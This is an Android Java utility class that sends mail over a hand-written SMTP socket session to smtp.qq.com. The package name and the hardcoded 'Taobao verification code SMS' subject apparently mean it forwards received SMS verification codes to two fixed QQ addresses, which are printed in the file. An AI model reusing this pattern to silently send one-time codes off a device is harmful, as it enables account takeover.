package com.sandro.smstotxlqqmail;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

import org.apache.http.util.EncodingUtils;

import android.content.Context;
import android.util.Log;

/**
 * 
 * @ClassName: SendMailUtil
 * @Description:发邮件
 * @author: Gary Yuan
 * @date: 2012-10-15 下午12:02:17
 * 
 */
public class SendMailUtil {

	Socket client = null;
	DataOutputStream dout;
	DataInputStream din;
	int tag = 0;
	String MAIL_FROM = "382667954@qq.com";
	String RCPT_TO = "<35192280@qq.com>;<382667954@qq.com>";
	String[] mailArray;
	int index = 0;

	private SendMailListener listener = null;

	public interface SendMailListener {
		void sendMailDone();
	}

	public SendMailUtil(SendMailListener l) {
		listener = l;
	}

	public void Send(final String data, final Context context) {

		try {
			// client = new Socket("smtp.qq.com", 25);
			client = new Socket("smtp.qq.com", 25);
			dout = new DataOutputStream(client.getOutputStream());
			din = new DataInputStream(client.getInputStream());

			mailArray = RCPT_TO.split(";");

		} catch (UnknownHostException e) {
			Log.e("SendMailUtil", "UnknownHostException : " + e.toString());
		} catch (IOException e) {
			Log.e("SendMailUtil", "create socket IOException : " + e.toString());
		}
		// myHandler = new MyHandler();
		Thread myThread = new Thread() {

			@Override
			public void run() {
				while (true) {
					try {
						if (!client.isConnected()) {
							Thread.sleep(100);
						} else {
							byte[] buffer = new byte[300];
							din.read(buffer);

							String cmd = new String(buffer);
							buffer = null;
							Log.i("SendMailUtil", "tag : " + tag + " ,cmd : " + cmd);
							if (tag == 0 && cmd.contains("220")) {
								// dout.writeBytes("EHLO pop.qq.com\r\n");
								dout.writeBytes("EHLO pop.qq.com\r\n");
								Log.d("SendMailUtil", "tag : " + 0 + " ,cmd : " + 220);
							} else if (tag == 1) {
								dout.writeBytes("AUTH LOGIN\r\n");
								Log.d("SendMailUtil", "tag : " +1 );
							} else if (tag == 2 && cmd.contains("334")) { 
								dout.writeBytes("");//邮箱用户名加密 如：MzgyNKDICnxedxLmNvbQ==\r\n
								Log.d("SendMailUtil", "tag : " + 2 + " ,cmd : " + 334);

							} else if (tag == 3 && cmd.contains("334")) { 
								dout.writeBytes("");//邮箱密码加密 如：veFergSMpIw==\r\n
								Log.d("SendMailUtil", "tag : " + 3 + " ,cmd : " + 334);

							} else if (tag == 4 && cmd.contains("235")) { // 235
																			// Authentication
																			// successful
								StringBuffer mailFrom = new StringBuffer();
								mailFrom.append("MAIL FROM:<");
								mailFrom.append(MAIL_FROM);
								mailFrom.append(">");
								mailFrom.append("\r\n");

								dout.writeBytes(mailFrom.toString());
								mailFrom = null;
								Log.d("SendMailUtil", "tag : " + 4 + " ,cmd : " + 235);
							} else if (tag >= 5
									&& tag <= (5 + mailArray.length - 1)
									&& cmd.contains("250")) { // 250 Mail OK
								StringBuffer mailTo = new StringBuffer();
								mailTo.append("RCPT TO:");
								mailTo.append(mailArray[index]);
								mailTo.append("\r\n");

								dout.writeBytes(mailTo.toString());

								mailTo = null;
								++index;
								Log.d("SendMailUtil", "tag : " + 5 + " ,cmd : " + 250);
							} else if (tag == (6 + mailArray.length - 1)
									&& cmd.contains("250")) { // cmd= 250 Mail
																// OK
								dout.writeBytes("DATA\r\n");
								Log.d("SendMailUtil", "tag : " + 6 + " ,cmd : " + 250);
							} else if (tag == (7 + mailArray.length - 1)
									&& cmd.contains("354")) { // 354 Send
																// message,
																// end with a
																// "." on
																// a line by
																// itself
																// |||or||| 354
																// End
																// data with
																// <CR><LF>.<CR><LF>
								StringBuffer mailbody = new StringBuffer();
								mailbody.append("From:<");
								mailbody.append(MAIL_FROM);
								mailbody.append(">");
								mailbody.append("\r\n");
								mailbody.append("Subject: 淘宝网 验证码 短信");
								// mailbody.append( [UT_Date GetCurLocalTime] );
								mailbody.append("\r\n");
								mailbody.append("To:");
								mailbody.append(RCPT_TO);
								mailbody.append("\r\n");
								mailbody.append("\r\n");
								mailbody.append("验证码短信。");
								mailbody.append("\r\n");
								mailbody.append(data);
								mailbody.append("\r\n");
								mailbody.append("\r\n");
								mailbody.append("\r\n");
								mailbody.append(".");
								mailbody.append("\r\n");

								dout.write(EncodingUtils.getBytes(
										mailbody.toString(), "GBK"));
								mailbody = null;
								Log.i("SendMailUtil", "tag : " + 7 + " ,cmd : " + 354);
							} else if (tag == (8 + mailArray.length - 1)
									&& cmd.contains("250")) { // 250 OK, message
																// accepted for
																// delivery:
																// queued
																// as 12345
																// |||or|||
																// cmd= 250 Mail
																// OK
																// queued as
																// smtp4,DtGowEDZR0y7fShQ6DZPEg--.1007S2
																// 1344831074
								dout.writeBytes("QUIT\r\n");
								Log.d("SendMailUtil", "tag : " + 8 + " ,cmd : " + 250);
								break;
							} else if (tag == (9 + mailArray.length - 1)
									&& cmd.contains("221")) { // 221 Bye
								Log.w("SendMailUtil", "tag : " + 9 + " ,cmd : " + 221);
								break;
							} else {
								Log.w("SendMailUtil", "break");
								break;
							}

							tag++;
							cmd = null;
							buffer = null;

						}
					} catch (InterruptedException e) {
						Log.e("SendMailUtil", "InterruptedException  " + e.toString());
						break;
					}
					// Message msg = new Message();
					// SocketActivity.this.myHandler.sendMessage(msg);
					catch (IOException e) {
						Log.e("SendMailUtil", "IOException123  " + e.toString());
						break;
					}
				}

				try {
					client.close();
					client = null;
				} catch (IOException e) {
					Log.e("SendMailUtil", "end IOException  " + e.toString());
				}
				Log.i("SendMailUtil", "send done!!  " );
				if (null != listener) {
					listener.sendMailDone();
				}
			}
		};
		myThread.start();
		Log.i("SendMailUtil", "mailThread start!!  " );
	}
}